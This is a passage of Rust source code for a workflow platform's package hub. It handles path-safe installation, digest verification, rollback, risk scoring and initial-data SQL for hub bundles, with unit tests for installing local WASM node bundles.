        "jsx" => "jsx".to_string(),
        "css" => "css".to_string(),
        "json" => "json".to_string(),
        "sql" => "sql".to_string(),
        other if !other.is_empty() => other.to_string(),
        _ => "file".to_string(),
    }
}

fn install_root_for_target_folder(
    package_id: &str,
    asset_kind: &str,
    target_folder: &str,
) -> String {
    let folder = target_folder.trim();
    if !folder.is_empty() {
        return normalize_install_target_folder(folder, asset_kind);
    }
    default_install_target_folder(package_id, asset_kind)
}

fn normalize_install_target_folder(target_folder: &str, asset_kind: &str) -> String {
    let folder = normalize_repo_rel(target_folder);
    if folder.is_empty() {
        return ".".to_string();
    }
    if target_folder.trim_start().starts_with('/')
        && matches!(
            asset_kind,
            HUB_ASSET_KIND_PIPELINE_BUNDLE | HUB_ASSET_KIND_TEMPLATE_BUNDLE
        )
        && !folder.starts_with("pipelines/")
    {
        return format!("pipelines/{folder}");
    }
    folder
}

fn install_rel_path_under_folder(install_root: &str, rel_path: &str) -> String {
    let root = normalize_repo_rel(install_root);
    let rel = install_entry_rel_inside_folder(rel_path);
    if root.is_empty() || root == "." {
        rel
    } else {
        format!("{root}/{rel}")
    }
}

fn install_entry_rel_inside_folder(rel_path: &str) -> String {
    let rel = normalize_repo_rel(rel_path);
    if let Some(rest) = rel.strip_prefix("pipelines/") {
        rest.to_string()
    } else if let Some(rest) = rel.strip_prefix("templates/") {
        rest.to_string()
    } else {
        rel
    }
}

fn default_install_target_folder(package_id: &str, asset_kind: &str) -> String {
    if matches!(
        asset_kind,
        HUB_ASSET_KIND_PIPELINE_BUNDLE | HUB_ASSET_KIND_TEMPLATE_BUNDLE
    ) {
        format!("pipelines/hub/{package_id}")
    } else if asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
        format!("nodes/{package_id}")
    } else {
        format!("hub/{package_id}")
    }
}

fn write_entry_content(
    dest_abs: &Path,
    entry: &HubPackageFile,
    artifacts: &HubArtifactChannel,
) -> Result<(), PlatformError> {
    atomic_write(dest_abs, &hub_entry_bytes(entry, artifacts)?)?;
    Ok(())
}

/// The bytes one manifest entry writes.
///
/// A carried entry has them inline; a referenced entry is fetched from the
/// channel and verified against its declared digest. Either way the bytes are
/// produced before anything is written, so a reference that cannot be resolved
/// refuses the install instead of landing as an empty file.
fn hub_entry_bytes(
    entry: &HubPackageFile,
    artifacts: &HubArtifactChannel,
) -> Result<Vec<u8>, PlatformError> {
    match entry.supply() {
        Some(HubPackageFileSupply::Carried(content)) if entry.encoding == "base64" => {
            base64::engine::general_purpose::STANDARD
                .decode(content)
                .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))
        }
        Some(HubPackageFileSupply::Carried(content)) => Ok(content.as_bytes().to_vec()),
        Some(HubPackageFileSupply::Referenced(artifact)) => {
            artifacts.resolve(&entry.rel_path, artifact, entry.size_bytes)
        }
        None => Err(PlatformError::new(
            "HUB_INSTALL",
            format!(
                "file '{}' declares neither carried content nor a referenced artifact",
                entry.rel_path
            ),
        )),
    }
}

fn prepare_hub_install_entries(
    install_base: &Path,
    install_root: &str,
    files: &[HubPackageFile],
    artifacts: &HubArtifactChannel,
) -> Result<Vec<PreparedHubInstallEntry>, PlatformError> {
    let mut seen = HashSet::new();
    let mut prepared = Vec::with_capacity(files.len());
    for entry in files {
        let install_rel = install_rel_path_under_folder(install_root, &entry.rel_path);
        if !seen.insert(install_rel.clone()) {
            return Err(PlatformError::new(
                "HUB_INSTALL",
                format!("package contains duplicate destination '{install_rel}'"),
            ));
        }
        let destination = install_base.join(&install_rel);
        if !destination.starts_with(install_base) {
            return Err(PlatformError::new(
                "HUB_INSTALL",
                format!("destination '{install_rel}' escapes the install root"),
            ));
        }
        let previous = match std::fs::symlink_metadata(&destination) {
            Ok(metadata) if metadata.file_type().is_symlink() => {
                return Err(PlatformError::new(
                    "HUB_INSTALL",
                    format!("destination '{install_rel}' is a symbolic link"),
                ));
            }
            Ok(metadata) if !metadata.is_file() => {
                return Err(PlatformError::new(
                    "HUB_INSTALL",
                    format!("destination '{install_rel}' is not a regular file"),
                ));
            }
            Ok(_) => Some(std::fs::read(&destination)?),
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
            Err(error) => return Err(error.into()),
        };
        prepared.push(PreparedHubInstallEntry {
            install_rel,
            destination,
            bytes: hub_entry_bytes(entry, artifacts)?,
            previous,
        });
    }
    Ok(prepared)
}

fn validate_prepared_pipeline_sources(
    entries: &[PreparedHubInstallEntry],
) -> Result<(), PlatformError> {
    for entry in entries.iter().filter(|entry| {
        entry.install_rel.starts_with("pipelines/") && entry.install_rel.ends_with(".zf.json")
    }) {
        decode_pipeline_graph(&entry.bytes).map_err(|error| {
            PlatformError::new(
                "HUB_INSTALL",
                format!(
                    "invalid pipeline '{}': {} ({})",
                    entry.install_rel,
                    error,
                    error.category()
                ),
            )
        })?;
    }
    Ok(())
}

fn restore_hub_install_entries(
    install_base: &Path,
    entries: &[PreparedHubInstallEntry],
) -> Result<(), PlatformError> {
    let mut errors = Vec::new();
    for entry in entries.iter().rev() {
        let result = match &entry.previous {
            Some(previous) => atomic_write(&entry.destination, previous),
            None => durable_remove_file(&entry.destination),
        };
        if let Err(error) = result {
            errors.push(format!("{}: {error}", entry.install_rel));
        }
    }
    for entry in entries.iter().filter(|entry| entry.previous.is_none()) {
        let mut parent = entry.destination.parent();
        while let Some(path) = parent {
            if path == install_base || !path.starts_with(install_base) {
                break;
            }
            match std::fs::remove_dir(path) {
                Ok(()) => parent = path.parent(),
                Err(error)
                    if matches!(
                        error.kind(),
                        std::io::ErrorKind::NotFound | std::io::ErrorKind::DirectoryNotEmpty
                    ) =>
                {
                    break;
                }
                Err(error) => {
                    errors.push(format!("{}: {error}", path.display()));
                    break;
                }
            }
        }
    }
    if errors.is_empty() {
        Ok(())
    } else {
        Err(PlatformError::new(
            "HUB_INSTALL_RECOVERY",
            format!("failed restoring package files: {}", errors.join("; ")),
        ))
    }
}

fn parse_hub_artifact_bytes(
    bytes: &[u8],
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    decode_hub_package(bytes)
        .map(|document| document.spec)
        .map_err(|err| PlatformError::new(error_code, format!("{} ({})", err, err.category())))
}

/// Parses a locally supplied bundle and refuses anything that is not one.
///
/// The transport is the same `HubPackage` envelope a published artifact uses,
/// so this reuses that contract rather than inventing a second package format.
fn parse_local_node_bundle_artifact(
    value: Value,
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    require_node_bundle_kind(parse_hub_artifact_value(value, error_code)?, error_code)
}

/// Reads one bundle document from disk, bounded by the document ceiling.
///
/// The size is checked before the read, so an oversized file is refused rather
/// than loaded to discover it is too big.
fn read_local_node_bundle_document(
    document_path: &Path,
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    let metadata = fs::metadata(document_path)?;
    if !metadata.is_file() {
        return Err(PlatformError::new(
            error_code,
            format!("'{}' is not a file", document_path.display()),
        ));
    }
    if metadata.len() > MAX_REMOTE_HUB_ARTIFACT_BYTES {
        return Err(PlatformError::new(
            error_code,
            format!(
                "'{}' exceeds the package document limit",
                document_path.display()
            ),
        ));
    }
    let raw = fs::read(document_path)?;
    require_node_bundle_kind(parse_hub_artifact_bytes(&raw, error_code)?, error_code)
}

fn require_node_bundle_kind(
    payload: HubPackageSpec,
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    if payload.asset_kind != HUB_ASSET_KIND_NODE_BUNDLE {
        return Err(PlatformError::new(
            error_code,
            format!(
                "this endpoint installs node bundles; the package declares asset_kind '{}'",
                payload.asset_kind
            ),
        ));
    }
    Ok(payload)
}

fn parse_hub_artifact_value(
    value: Value,
    error_code: &'static str,
) -> Result<HubPackageSpec, PlatformError> {
    decode_contract_value::<HubPackageContract>(value)
        .map(|document| document.spec)
        .map_err(|err| PlatformError::new(error_code, format!("{} ({})", err, err.category())))
}

fn encode_hub_artifact(
    package_id: &str,
    version: &str,
    artifact: &HubPackageSpec,
    error_code: &'static str,
) -> Result<Vec<u8>, PlatformError> {
    let mut metadata = ContractMetadata::named(package_id);
    metadata.version = Some(version.to_string());
    encode_hub_package(metadata, artifact.clone())
        .map_err(|err| PlatformError::new(error_code, format!("{} ({})", err, err.category())))
}

fn verify_hub_artifact_bytes(bytes: &[u8], expected: &str) -> Result<(), PlatformError> {
    let actual = sha256_hex(bytes);
    if actual == expected {
        return Ok(());
    }
    Err(PlatformError::new(
        "HUB_ARTIFACT_INTEGRITY",
        format!("hub artifact hash mismatch: expected {expected}, got {actual}"),
    ))
}

fn reindex_project_bundle_pipelines(
    hub: &HubService,
    owner: &str,
    project: &str,
    entries: &[HubPackageFile],
) -> Result<(), PlatformError> {
    for entry in entries {
        let rel_path = normalize_repo_rel(&entry.rel_path);
        if !rel_path.starts_with("pipelines/") || !rel_path.ends_with(".zf.json") {
            continue;
        }
        let Some(source) = entry_text(entry) else {
            continue;
        };
        let description = decode_pipeline_graph(source.as_bytes())
            .ok()
            .and_then(|document| document.spec.description)
            .unwrap_or_default();
        let trigger_kind = derive_trigger_kind_from_source(&source).unwrap_or_default();
        hub.projects.upsert_pipeline_definition(
            owner,
            project,
            &rel_path,
            "",
            &description,
            &trigger_kind,
            &source,
        )?;
    }
    Ok(())
}

/// The text of a carried entry, or `None` when it is binary or referenced.
fn entry_text(entry: &HubPackageFile) -> Option<String> {
    let HubPackageFileSupply::Carried(content) = entry.supply()? else {
        return None;
    };
    if entry.encoding == "base64" {
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(content)
            .ok()?;
        return String::from_utf8(bytes).ok();
    }
    Some(content.to_string())
}

/// The text one manifest entry contributes to the safety review.
///
/// A referenced entry is fetched and verified through the channel here, so the
/// review reads exactly the bytes the install would write instead of nothing.
/// `Err` is the answer that matters: bytes exist that the review cannot see,
/// which is never the same fact as an empty file.
fn entry_review_text(
    entry: &HubPackageFile,
    artifacts: &HubArtifactChannel,
) -> Result<String, String> {
    let bytes = match entry.supply() {
        Some(HubPackageFileSupply::Carried(content)) if entry.encoding == "base64" => {
            base64::engine::general_purpose::STANDARD
                .decode(content)
                .map_err(|error| format!("base64 content does not decode: {error}"))?
        }
        Some(HubPackageFileSupply::Carried(content)) => return Ok(content.to_string()),
        Some(HubPackageFileSupply::Referenced(artifact)) => artifacts
            .resolve(&entry.rel_path, artifact, entry.size_bytes)
            .map_err(|error| error.to_string())?,
        None => {
            return Err(
                "the entry declares neither carried content nor a referenced artifact".to_string(),
            );
        }
    };
    String::from_utf8(bytes).map_err(|_| "the bytes are not UTF-8 text".to_string())
}

fn package_policy_entry(
    rel_path: &str,
    entry: &HubPackageFile,
    artifacts: &HubArtifactChannel,
) -> PackagePolicyEntry {
    let (content, unreadable) = match entry_review_text(entry, artifacts) {
        Ok(text) => (text, String::new()),
        Err(reason) => (String::new(), reason),
    };
    PackagePolicyEntry {
        rel_path: rel_path.to_string(),
        kind: entry.kind.clone(),
        size_bytes: entry.size_bytes,
        content,
        unreadable,
    }
}

fn install_risk_level(policy: &PackageSafetyReview, has_overwrites: bool) -> String {
    // Overwrites re-score an installable package. They cannot re-score one that
    // is refused outright, so a violation short-circuits before any of it.
    if !policy.violations.is_empty() {
        return PolicyRiskLevel::Blocked.as_str().to_string();
    }
    let mut risk_score = 0;
    if has_overwrites {
        risk_score += 2;
    }
    if !policy.credentials_required.is_empty() {
        risk_score += 1;
    }
    if !policy.external_urls.is_empty() {
        risk_score += 1;
    }
    if !policy.database_effects.is_empty() {
        risk_score += 2;
    }
    if !policy.filesystem_effects.is_empty() {
        risk_score += 1;
    }
    if !policy.public_endpoints.is_empty() || !policy.schedules.is_empty() {
        risk_score += 2;
    }
    if !policy.large_files.is_empty() || !policy.seed_data.is_empty() {
        risk_score += 1;
    }
    if risk_score >= 4 {
        "high".to_string()
    } else if risk_score >= 2 {
        "medium".to_string()
    } else {
        "low".to_string()
    }
}

const INITIAL_DATA_DIRS: &[(&str, &str)] = &[
    ("initial-data/sekejap", "sekejap"),
    ("initial-data/sqlite", "sqlite"),
    ("init/sekejap", "sekejap"),
    ("init/sqlite", "sqlite"),
    ("seeds/sekejap", "sekejap"),
    ("seeds/sqlite", "sqlite"),
];

fn initial_data_engine_for_path(rel_path: &str) -> Option<&'static str> {
    let rel = normalize_repo_rel(rel_path);
    if !rel.ends_with(".sql") {
        return None;
    }
    INITIAL_DATA_DIRS
        .iter()
        .find_map(|(prefix, engine)| rel.starts_with(&format!("{prefix}/")).then_some(*engine))
}

fn split_initial_data_sql(sql: &str) -> Vec<String> {
    let uncommented = sql
        .lines()
        .filter(|line| !line.trim_start().starts_with("--"))
        .collect::<Vec<_>>()
        .join("\n");
    uncommented
        .split(';')
        .map(str::trim)
        .filter(|stmt| !stmt.is_empty())
        .map(|stmt| format!("{stmt};"))
        .collect()
}

fn initial_data_step_from_entry(entry: &HubPackageFile) -> Option<HubPackageInitialDataStep> {
    let rel = normalize_repo_rel(&entry.rel_path);
    let engine = initial_data_engine_for_path(&rel)?;
    let sql = entry_text(entry)?;
    Some(HubPackageInitialDataStep {
        engine: engine.to_string(),
        path: rel,
        statement_count: split_initial_data_sql(&sql).len(),
        size_bytes: entry.size_bytes,
    })
}

fn execute_project_initial_data(
    data_root: &Path,
    owner: &str,
    project: &str,
    layout: &ProjectFileLayout,
    steps: &[HubPackageInitialDataStep],
) -> Result<(), PlatformError> {
    for step in steps {
        let rel = normalize_repo_rel(&step.path);
        let Some(engine) = initial_data_engine_for_path(&rel) else {
            return Err(PlatformError::new(
                "HUB_INITIAL_DATA_INVALID",
                format!("initial data path '{}' is not allowed", step.path),
            ));
        };
        if engine != step.engine {
            return Err(PlatformError::new(
                "HUB_INITIAL_DATA_INVALID",
                format!(
                    "initial data path '{}' does not match engine '{}'",
                    step.path, step.engine
                ),
            ));
        }
        let path = sanitize_install_repo_path(layout, &rel)?;
        let sql = fs::read_to_string(&path)?;
        match engine {
            "sekejap" => {
                for stmt in split_initial_data_sql(&sql) {
                    sekejap::execute_sql(data_root, owner, project, &stmt, &[], 0, false)?;
                }
            }
            "sqlite" => {
                sqlite_schema::execute_sql(data_root, owner, project, &sql)?;
            }
            _ => {
                return Err(PlatformError::new(
                    "HUB_INITIAL_DATA_INVALID",
                    format!("unsupported initial data engine '{}'", engine),
                ));
            }
        }
    }
    Ok(())
}

fn collect_initial_data_steps(
    repo_dir: &Path,
    dir: &Path,
    engine: &str,
    steps: &mut Vec<HubPackageInitialDataStep>,
) -> Result<(), PlatformError> {
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        if path.is_dir() {
            collect_initial_data_steps(repo_dir, &path, engine, steps)?;
            continue;
        }
        if path
            .extension()
            .and_then(|value| value.to_str())
            .map(|value| value.eq_ignore_ascii_case("sql"))
            != Some(true)
        {
            continue;
        }
        let rel = path
            .strip_prefix(repo_dir)
            .map_err(|err| PlatformError::new("HUB_INITIAL_DATA", err.to_string()))?;
        let rel = normalize_repo_rel(&rel.to_string_lossy());
        if initial_data_engine_for_path(&rel) != Some(engine) {
            continue;
        }
        let sql = fs::read_to_string(&path)?;
        let size_bytes = sql.len();
        steps.push(HubPackageInitialDataStep {
            engine: engine.to_string(),
            path: rel,
            statement_count: split_initial_data_sql(&sql).len(),
            size_bytes,
        });
    }
    Ok(())
}

fn verify_remote_artifact_hash(payload: &RemoteHubArtifactResponse) -> Result<(), PlatformError> {
    if payload.artifact_size_bytes > MAX_REMOTE_HUB_ARTIFACT_BYTES {
        return Err(PlatformError::new(
            "HUB_ARTIFACT_TOO_LARGE",
            "remote artifact exceeds maximum install size",
        ));
    }
    let expected = payload
        .artifact_sha256
        .trim()
        .to_string()
        .if_empty_then(|| payload.version.artifact_sha256.trim().to_string());
    if expected.is_empty() {
        return Err(PlatformError::new(
            "HUB_REMOTE_HASH_MISSING",
            "remote artifact response is missing artifact hash",
        ));
    }
    let document =
        decode_contract_value::<HubPackageContract>(payload.artifact.clone()).map_err(|err| {
            PlatformError::new(
                "HUB_REMOTE_INVALID",
                format!("{} ({})", err, err.category()),
            )
        })?;
    let bytes = encode_hub_package(document.metadata, document.spec)
        .map_err(|err| PlatformError::new("HUB_REMOTE_INVALID", err.to_string()))?;
    let actual = sha256_hex(&bytes);
    if actual != expected {
        return Err(PlatformError::new(
            "HUB_REMOTE_HASH_MISMATCH",
            "remote artifact hash mismatch",
        ));
    }
    Ok(())
}

trait EmptyStringExt {
    fn if_empty_then<F>(self, fallback: F) -> String
    where
        F: FnOnce() -> String;
}

impl EmptyStringExt for String {
    fn if_empty_then<F>(self, fallback: F) -> String
    where
        F: FnOnce() -> String,
    {
        if self.is_empty() { fallback() } else { self }
    }
}

fn sanitize_hub_export_entries(entries: &mut [HubPackageFile]) -> Result<(), PlatformError> {
    for entry in entries.iter_mut() {
        if normalize_repo_rel(&entry.rel_path)
            != crate::contracts::kinds::PROJECT_CONFIGURATION_FILE
        {
            continue;
        }
        let Some(HubPackageFileSupply::Carried(source)) =
            entry.supply().filter(|_| entry.encoding != "base64")
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISH",
                "zebflow.yaml must be a carried text entry",
            ));
        };
        let mut document = crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(
            source.as_bytes(),
        )
        .map_err(|err| PlatformError::new("HUB_PUBLISH", format!("invalid zebflow.yaml: {err}")))?;
        let cfg = &mut document.spec;
        cfg.distribution.hub.producer_enabled = false;
        let content = String::from_utf8(
            crate::contracts::encode_contract_yaml::<ProjectConfigurationContract>(
                document.metadata,
                document.spec,
            )
            .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?,
        )
        .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?;
        entry.size_bytes = content.len();
        entry.content = Some(content);
    }
    Ok(())
}

fn retarget_project_configuration(
    entries: &mut [HubPackageFile],
    target_project: &str,
) -> Result<(), PlatformError> {
    let mut matches = entries.iter_mut().filter(|entry| {
        normalize_repo_rel(&entry.rel_path) == crate::contracts::kinds::PROJECT_CONFIGURATION_FILE
    });
    let entry = matches.next().ok_or_else(|| {
        PlatformError::new("HUB_INSTALL", "project bundle is missing zebflow.yaml")
    })?;
    if matches.next().is_some() {
        return Err(PlatformError::new(
            "HUB_INSTALL",
            "project bundle contains more than one zebflow.yaml",
        ));
    }
    let Some(HubPackageFileSupply::Carried(source)) =
        entry.supply().filter(|_| entry.encoding != "base64")
    else {
        return Err(PlatformError::new(
            "HUB_INSTALL",
            "zebflow.yaml must be a carried text entry",
        ));
    };
    let mut document = crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(
        source.as_bytes(),
    )
    .map_err(|err| PlatformError::new("HUB_INSTALL", format!("invalid zebflow.yaml: {err}")))?;
    document.metadata.name = target_project.to_string();
    let content = String::from_utf8(
        crate::contracts::encode_contract_yaml::<ProjectConfigurationContract>(
            document.metadata,
            document.spec,
        )
        .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?,
    )
    .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
    entry.size_bytes = content.len();
    entry.encoding = "text".to_string();
    entry.content = Some(content);
    Ok(())
}

fn retarget_dependency_lock(
    entries: &mut [HubPackageFile],
    target_project: &str,
) -> Result<(), PlatformError> {
    let mut matches = entries
        .iter_mut()
        .filter(|entry| normalize_repo_rel(&entry.rel_path) == DEPENDENCY_LOCK_FILE);
    let Some(entry) = matches.next() else {
        return Ok(());
    };
    if matches.next().is_some() {
        return Err(PlatformError::new(
            "HUB_INSTALL",
            "project bundle contains more than one zeb.lock",
        ));
    }
    let Some(HubPackageFileSupply::Carried(source)) =
        entry.supply().filter(|_| entry.encoding != "base64")
    else {
        return Err(PlatformError::new(
            "HUB_INSTALL",
            "zeb.lock must be a carried text entry",
        ));
    };
    let mut document = decode_contract::<DependencyLockContract>(source.as_bytes())
        .map_err(|err| PlatformError::new("HUB_INSTALL", format!("invalid zeb.lock: {err}")))?;
    document.metadata.name = target_project.to_string();
    let content = String::from_utf8(
        encode_contract::<DependencyLockContract>(document.metadata, document.spec)
            .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?,
    )
    .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
    entry.size_bytes = content.len();
    entry.encoding = "text".to_string();
    entry.content = Some(content);
    Ok(())
}

fn infer_pipeline_meta(source: &str, install_rel: &str) -> (String, String) {
    let fallback_title = Path::new(install_rel)
        .file_stem()
        .and_then(|v| v.to_str())
        .unwrap_or("Imported Pipeline")
        .replace(".zf", "")
        .replace('-', " ");
    let Ok(document) = decode_pipeline_graph(source.as_bytes()) else {
        return (fallback_title, "webhook".to_string());
    };
    let trigger_kind = document
        .spec
        .nodes
        .iter()
        .find_map(|node| {
            node.kind
                .strip_prefix("n.trigger.")
                .map(ToString::to_string)
        })
        .unwrap_or_else(|| "webhook".to_string());
    (fallback_title, trigger_kind)
}

#[cfg(test)]
mod tests {
    use super::*;

    const PROJECT_CONFIGURATION_FIXTURE: &str =
        include_str!("../../../tests/fixtures/contracts/project-configuration/v1-complete.yaml");

    #[test]
    fn hub_export_rejects_malformed_project_configuration() {
        let mut entries = vec![text_export_entry(
            crate::contracts::kinds::PROJECT_CONFIGURATION_FILE,
            "project_configuration",
            "test",
            "not: [valid".to_string(),
        )];
        assert!(sanitize_hub_export_entries(&mut entries).is_err());
        assert!(
            rewrite_project_libraries(
                &mut build_preview(
                    "project_bundle".to_string(),
                    "project".to_string(),
                    "project".to_string(),
                    "Project".to_string(),
                    String::new(),
                    entries,
                    Vec::new(),
                ),
                &[]
            )
            .is_err()
        );
    }

    #[test]
    fn hub_export_sanitizes_project_configuration_through_the_contract() {
        let mut entries = vec![text_export_entry(
            crate::contracts::kinds::PROJECT_CONFIGURATION_FILE,
            "project_configuration",
            "test",
            PROJECT_CONFIGURATION_FIXTURE.to_string(),
        )];
        sanitize_hub_export_entries(&mut entries).unwrap();
        let document = crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(
            entries[0]
                .content
                .as_deref()
                .expect("carried entry")
                .as_bytes(),
        )
        .unwrap();
        assert!(!document.spec.distribution.hub.producer_enabled);
    }

    #[test]
    fn project_bundle_install_retargets_project_configuration_identity() {
        let mut entries = vec![text_export_entry(
            crate::contracts::kinds::PROJECT_CONFIGURATION_FILE,
            "project_configuration",
            "test",
            PROJECT_CONFIGURATION_FIXTURE.to_string(),
        )];
        retarget_project_configuration(&mut entries, "installed-project").unwrap();
        let document = crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(
            entries[0]
                .content
                .as_deref()
                .expect("carried entry")
                .as_bytes(),
        )
        .unwrap();
        assert_eq!(document.metadata.name, "installed-project");

        assert!(retarget_project_configuration(&mut [], "installed-project").is_err());
    }

    #[test]
    fn hub_artifact_rejects_missing_and_future_schema() {
        let missing = serde_json::json!({
            "kind": "HubPackage",
            "metadata": {"name": "example", "version": "1.0.0"},
            "spec": {"asset_kind": "pipeline_bundle"}
        });
        let err = parse_hub_artifact_value(missing, "TEST_HUB").unwrap_err();
        assert_eq!(err.code, "TEST_HUB");
        assert!(
            err.message
                .contains("missing required root field 'apiVersion'")
        );

        let future = serde_json::json!({
            "apiVersion": "zebflow.com/v2",
            "kind": "HubPackage",
            "metadata": {"name": "example", "version": "1.0.0"},
            "spec": {}
        });
        let err = parse_hub_artifact_value(future, "TEST_HUB").unwrap_err();
        assert_eq!(err.code, "TEST_HUB");
        assert!(err.message.contains("unsupported apiVersion"));
    }

    fn wasm_node_entry(kind: &str, title: &str, export: &str) -> serde_json::Value {
        serde_json::json!({
            "kind": kind,
            "title": title,
            "description": "E2E WASM node used by installation and runtime tests.",
            "icon": "",
            "ui_category": "wasm.e2e",
            "ui_category_label": "WASM E2E",
            "uses_credentials": [],
            "run": { "module": "core", "export": export },
            "definition": {
                "input_pins": ["in"],
                "output_pins": ["out"],
                "config_schema": { "type": "object" },
                "input_schema": {},
                "output_schema": {},
                "examples": [],
                "failure_semantics": [],
                "fields": [],
                "layout": [],
                "dsl_flags": []
            }
        })
    }

    /// A bundle authored locally has no Hub entry, so before this there was no
    /// way to install it at all. It runs the same review a published package
    /// runs.
    #[test]
    fn a_local_bundle_installs_through_the_same_review_and_installer() {
        use base64::Engine as _;

        let root = tempfile::tempdir().unwrap();
        let platform = crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap();
        let owner = "superadmin";
        let project = "default";

        let module =
            include_bytes!("../../../tests/fixtures/contracts/node-bundle/two-exports.wasm");
        let definition = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "NodeBundle",
            "metadata": { "name": "localpkg", "version": "1.0.0" },
            "spec": {
                "package": "localpkg",
                "version": "1.0.0",
                "title": "Local Package",
                "description": "Installed from a file rather than from a Hub.",
                "icon": "icon.svg",
                "credentials": [],
                "hosts": [],
                "functions": {},
                "modules": {
                    "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                },
                "nodes": [wasm_node_entry("n.x.localpkg.train", "Train", "e2e_train")]
            }
        })
        .to_string();
        let icon = "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";
        let artifact = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "HubPackage",
            "metadata": { "name": "localpkg", "version": "1.0.0" },
            "spec": {
                "asset_kind": "node_bundle",
                "title": "Local Package",
                "description": "Installed from a file rather than from a Hub.",
                "files": [
                    { "rel_path": "definition.json", "kind": "node_definition",
                      "size_bytes": definition.len(), "reason": "local", "content": definition },
                    { "rel_path": "icon.svg", "kind": "asset",
                      "size_bytes": icon.len(), "reason": "local", "content": icon },
                    { "rel_path": "wasm/core.wasm", "kind": "asset",
                      "size_bytes": module.len(), "reason": "local", "encoding": "base64",
                      "content": base64::engine::general_purpose::STANDARD.encode(module) }
                ]
            }
        });

        let review = platform
            .hub
            .review_local_node_bundle(owner, project, "localpkg", "1.0.0", "", artifact.clone())
            .expect("review succeeds");
        assert_eq!(review.asset_kind, "node_bundle");
        assert!(review.installable, "nothing blocks this package");
        assert!(review.violations.is_empty());
        assert!(
            review
                .files_added
                .iter()
                .any(|f| f.ends_with("definition.json")),
            "the review reports what would be written"
        );

        platform
            .hub
            .install_local_node_bundle(owner, project, "localpkg", "1.0.0", "", artifact)
            .expect("install succeeds");

        let installed = platform
            .node_registry
            .get_by_kind(owner, project, "n.x.localpkg.train")
            .expect("the node is installed");
        assert_eq!(
            installed.manifest.source,
            crate::platform::model::NodePackageSource::Wasm
        );
    }

    /// This endpoint installs node bundles, so anything else is refused rather
    /// than quietly installed through a node-shaped door.
    #[test]
    fn a_local_install_refuses_a_package_that_is_not_a_node_bundle() {
        let root = tempfile::tempdir().unwrap();
        let platform = crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap();
        let artifact = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "HubPackage",
            "metadata": { "name": "notabundle", "version": "1.0.0" },
            "spec": {
                "asset_kind": "pipeline",
                "title": "Not A Bundle",
                "description": "A pipeline package offered to the node installer.",
                "files": []
            }
        });
        let error = platform
            .hub
            .install_local_node_bundle("superadmin", "default", "notabundle", "1.0.0", "", artifact)
            .expect_err("a non-bundle must be refused");
        assert_eq!(error.code, "NODE_BUNDLE_INSTALL");
    }

    // ── Referenced artifacts ────────────────────────────────────────────
    //
    // A reference carries a digest and never a location, so every test below
    // supplies the location the way its channel does and proves the install
    // either verifies the bytes or refuses without touching what was there.

    /// The real WASM module every referenced-artifact test resolves.
    const REFERENCED_MODULE: &[u8] =
        include_bytes!("../../../tests/fixtures/contracts/node-bundle/two-exports.wasm");

    const REFERENCED_ICON: &str = "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";

    fn wasm_bundle_definition(package_id: &str, title: &str) -> String {
        serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "NodeBundle",
            "metadata": { "name": package_id, "version": "1.0.0" },
            "spec": {
                "package": package_id,
                "version": "1.0.0",
                "title": title,
                "description": "A bundle whose module may travel beside the document.",
                "icon": "icon.svg",
                "credentials": [],
                "hosts": [],
                "functions": {},
                "modules": {
                    "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                },
                "nodes": [wasm_node_entry(
                    &format!("n.x.{package_id}.train"),
                    "Train",
                    "e2e_train"
                )]
            }
        })
        .to_string()
    }

    /// A bundle document whose module entry is supplied by the caller, so one
    /// package shape covers both the carried and the referenced form.
    fn wasm_bundle_document(
        package_id: &str,
        title: &str,
        module_entry: serde_json::Value,
    ) -> serde_json::Value {
        let definition = wasm_bundle_definition(package_id, title);
        serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "HubPackage",
            "metadata": { "name": package_id, "version": "1.0.0" },
            "spec": {
                "asset_kind": "node_bundle",
                "title": title,
                "description": "A bundle whose module may travel beside the document.",
                "files": [
                    { "rel_path": "definition.json", "kind": "node_definition",
                      "size_bytes": definition.len(), "reason": "test",
                      "content": definition },
                    { "rel_path": "icon.svg", "kind": "asset",
                      "size_bytes": REFERENCED_ICON.len(), "reason": "test",
                      "content": REFERENCED_ICON },
                    module_entry
                ]
            }
        })
    }

    fn carried_module_entry() -> serde_json::Value {
        serde_json::json!({
            "rel_path": "wasm/core.wasm", "kind": "asset",
            "size_bytes": REFERENCED_MODULE.len(), "reason": "test", "encoding": "base64",
            "content": base64::engine::general_purpose::STANDARD.encode(REFERENCED_MODULE)
        })
    }

    fn referenced_module_entry(sha256: &str) -> serde_json::Value {
        serde_json::json!({
